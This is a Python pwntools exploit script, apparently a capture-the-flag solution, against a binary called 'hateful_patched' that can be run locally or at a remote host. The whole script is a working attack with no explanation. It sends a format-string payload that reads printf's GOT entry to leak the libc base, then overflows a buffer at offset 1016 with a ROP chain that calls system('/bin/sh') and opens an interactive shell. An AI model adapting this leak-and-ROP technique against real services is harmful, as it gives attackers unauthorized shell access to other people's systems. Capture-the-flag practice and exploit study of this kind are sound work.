#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hateful_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *send_message+111
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    payload  = b"%8$s"
    payload = payload.ljust(16, b".")
    payload += p64(exe.got["printf"])

    io.sendlineafter(b">>", b"yay")
    io.sendlineafter(b">>", payload)
    io.recvuntil(b"provided: ")
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym["printf"]
    info("libc base: %#x", libc.address)
    info("system: %#x", libc.sym["system"])

    offset = 1016
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = 0x0040101a # ret

    sh = next(libc.search(b"/bin/sh\x00"))
    system = libc.sym["system"]

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

